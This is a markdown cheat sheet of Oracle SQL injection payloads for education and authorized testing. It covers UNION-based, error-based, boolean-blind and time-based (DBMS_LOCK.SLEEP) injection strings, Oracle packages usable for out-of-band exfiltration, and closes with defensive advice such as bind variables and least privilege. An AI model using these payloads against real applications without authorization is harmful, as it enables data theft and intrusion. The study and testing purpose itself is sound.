# Oracle — Example SQL Injection Payloads & Notes (Non‑destructive, Educational)

> [!WARNING]
> **Ethics reminder:** The examples in this file are for education and authorized testing only. Do **not** run these payloads against systems you do not own or do not have explicit written permission to test. Oracle environments often have sensitive data and privileged functions — practice only in labs or controlled instances.

---

## Contents

* Basic detection probes
* UNION-based examples (non-destructive)
* Error-based examples (safe probes)
* Boolean-based blind examples
* Time-based blind examples (`DBMS_LOCK.SLEEP`, caveats)
* Stacked-queries and statement behavior in Oracle contexts
* Oracle-specific functions & packages (UTL\_HTTP, UTL\_INADDR, DBMS\_LDAP)
* Defensive notes specific to Oracle

---

## 1. Basic detection probes

Start with simple probes to see if user input influences SQL:

* `'` — single quote to provoke syntax errors.
* `"` — double quote depending on context.
* `1 OR 1=1` — logical manipulation probe.

Example probe:

```
GET /product?id=1'
```

Look for Oracle-style errors like `ORA-00933: SQL command not properly ended` or `ORA-01756: quoted string not properly terminated`.

---

## 2. UNION-based (non-destructive) examples

Assume original query: `SELECT id, name, price FROM products WHERE id = 'USER_INPUT'`

### Find column count

Use incremental `NULL` placeholders:

```sql
' UNION SELECT NULL FROM dual --
' UNION SELECT NULL, NULL FROM dual --
' UNION SELECT NULL, NULL, NULL FROM dual --
```

Stop when you no longer get column-count errors. Oracle often requires selecting from `DUAL` for standalone selects.

### Identify display columns

```sql
' UNION SELECT 'C1', 'C2', 'C3' FROM dual --
```

Observe which markers appear in the output to map reflected columns.

### Non-destructive enumeration examples

Once you identify reflection points:

```sql
' UNION SELECT NULL, banner, NULL FROM v$version --
' UNION SELECT NULL, user, NULL FROM dual --
```

Be aware that access to dynamic performance views (e.g., `v$version`) may be restricted.

---

## 3. Error-based (safe probes)

Trigger controlled errors to fingerprint the DBMS and observe behavior.

* Single quote: `'`
* Conversion or function errors (illustrative):

```sql
' AND 1=(SELECT TO_NUMBER((SELECT user) ) ) --
```

This may produce an `ORA-01722: invalid number` error revealing the attempted conversion context.

Avoid aggressive error payloads on production systems.

---

## 4. Boolean-based blind examples

Character extraction pattern (Oracle):

```sql
' AND SUBSTR((SELECT user FROM dual),1,1) = 'o' --
```

Confirm influence with `AND 1=1` / `AND 1=2` before attempting extraction.

Optimizations:

* Use `SUBSTR` instead of `SUBSTRING` (Oracle syntax).
* Limit character set and use binary search techniques where applicable.

---

## 5. Time-based blind examples (Oracle)

Oracle may provide `DBMS_LOCK.SLEEP(seconds)` or other timing mechanisms but they frequently require higher privileges.

### Example timing pattern (requires privileges)

```sql
' AND CASE WHEN SUBSTR((SELECT user FROM dual),1,1) = 'o' THEN DBMS_LOCK.SLEEP(5) ELSE NULL END IS NULL --
```

**Caveats:**

* `DBMS_LOCK.SLEEP` may require `EXECUTE` privilege on the `DBMS_LOCK` package.
* Many Oracle setups restrict usage of packages like `UTL_HTTP` and `DBMS_PIPE`.

---

## 6. Stacked-queries and statement behavior in Oracle

Oracle client APIs typically execute single statements per call in application contexts; stacked queries using `;` are less commonly exploitable via typical app interfaces. However, vulnerabilities can still arise in PL/SQL execution contexts or via dynamic SQL executed by the server.

### Safe check for multi-statement behavior (conceptual)

```sql
' ; BEGIN NULL; END; --
```

Test carefully in lab settings — Oracle’s PL/SQL block syntax differs from simple stacked statements.

---

## 7. Oracle-specific functions & packages

* `user` — current user name (can be selected from `dual`)
* `SYS_CONTEXT('USERENV','DB_NAME')` — environment context values
* `v$version`, `product_component_version`, `banner` — version info (privilege-dependent)
* `DBMS_LOCK.SLEEP(seconds)` — sleep function (privilege-dependent)
* `UTL_HTTP.REQUEST` — perform HTTP requests (privilege-dependent)
* `UTL_INADDR.GET_HOST_ADDRESS` — DNS resolution functions (privilege-dependent)
* `DBMS_PIPE` / `DBMS_OUTPUT` — intra-db messaging (varies by config)

Many of these packages require elevated privileges; modern hardened environments restrict access for application accounts.

---

## 8. Defensive notes specific to Oracle

> [!NOTE]
> * **Least privilege:** application accounts should not have `EXECUTE` permissions on powerful packages (`UTL_HTTP`, `DBMS_LOCK`, etc.).
> * **Use bind variables** and avoid string concatenation when building SQL or PL/SQL blocks.
> * **Limit access** to dynamic performance views and SYS-owned objects where possible.
> * **Disable or control network-capable packages** for application roles to stop OOB exfiltration via HTTP/DNS.
> * **Hide detailed Oracle errors** from end users and log exceptions internally.

---

## 9. Where to practice safely

> [!TIP]
> * Local Oracle Express (XE) instances with intentionally vulnerable web apps.
> * PortSwigger Academy labs (when Oracle targets are available).
> * Custom lab VMs configured to simulate Oracle-backed applications.